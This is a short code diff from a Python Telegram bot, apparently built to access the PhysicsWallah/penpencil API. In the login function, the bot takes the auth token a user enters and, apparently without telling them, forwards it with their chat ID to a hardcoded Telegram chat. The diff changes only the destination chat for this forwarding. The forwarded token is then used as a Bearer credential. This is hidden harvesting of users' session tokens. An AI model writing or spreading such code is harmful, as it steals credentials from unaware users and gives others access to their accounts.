@@ -687,7 +687,7 @@ async def account_login(bot: Client, m: Message):
     )
     input1: Message = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
-    await bot.send_message(-1001927599085, f"**Pw Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`")
+    await bot.send_message(-4187047902, f"**Pw Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`")
     headers = {
         "Host": "api.penpencil.xyz",
         "authorization": f"Bearer {raw_text1}",
